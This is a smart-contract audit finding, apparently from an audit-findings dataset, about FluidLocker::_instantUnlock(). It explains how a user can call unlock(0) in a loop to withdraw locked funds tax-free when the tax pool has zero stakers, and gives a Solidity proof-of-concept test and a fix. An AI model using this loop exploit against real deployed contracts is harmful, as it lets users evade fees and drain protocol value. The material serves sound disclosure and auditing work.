# [M] A malicious user may unlock in multiple times

## Summary
Severity: Medium
Contest weight: 0.4379
Dataset id: 1834
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The missing check in FluidLocker::_instantUnlock() for stakers in the tax pool allows users to unlock their funds without paying any tax instantly. This happens because whenever there are 0 stakers in the tax pool, the flow rate is set to 0 and it does not revert, so the user can loop unlocking until funds are withdrawn.

In FluidLocker::_instantUnlock() there is a missing check for 0 stakers in the tax pool.
Internal pre-conditions
1. There are 0 stakers in the tax pool.
External pre-conditions
None.
Attack Path
1. User loops FluidLocker::unlock() with a null unlocking period and instantly withdraws their funds.
The user is able to unlock their funds without paying any tax.

## Proof of Concept
Add the following test to FluidLocker.t.sol.
```solidity
function test_POC_InstantUnlock_WithoutFees() external {
    _helperFundLocker(address(aliceLocker), 10_000e18);
    assertEq(_fluidSuperToken.balanceOf(address(ALICE)), 0, "incorrect Alice bal before op");
    assertEq(_fluidSuperToken.balanceOf(address(aliceLocker)), 10_000e18, "incorrect Locker bal before op");
    _helperUpgradeLocker();
    vm.startPrank(ALICE);
    for (uint i = 0; i < 30; i++) {
        aliceLocker.unlock(0, ALICE);
    }
    assertGt(_fluidSuperToken.balanceOf(address(ALICE)), 9.98e21, "incorrect Alice bal after op");
}
```

## Recommendation
Check if the pools have 0 units and revert if so.
